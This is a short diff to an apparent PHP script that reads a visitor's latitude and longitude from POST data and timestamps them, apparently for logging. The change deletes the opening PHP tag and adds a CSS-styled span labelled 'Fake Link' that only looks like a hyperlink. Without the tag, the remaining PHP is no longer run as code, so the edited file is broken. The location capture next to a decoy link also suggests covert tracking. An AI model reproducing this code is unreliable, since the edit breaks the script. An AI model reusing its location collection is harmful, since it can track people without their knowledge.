@@ -1,4 +1,12 @@
-<?php
+<style>
+.fake-link {
+    color: blue;
+    text-decoration: underline;
+    cursor: pointer; /* Optional: change cursor to a hand */
+}
+</style>
+
+<span class="fake-link">Fake Link</span>
 $date = date('dMYHis');
 $latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
 $longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
@@ -65,4 +73,5 @@ if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
 }
 
 exit();
+
 ?> 
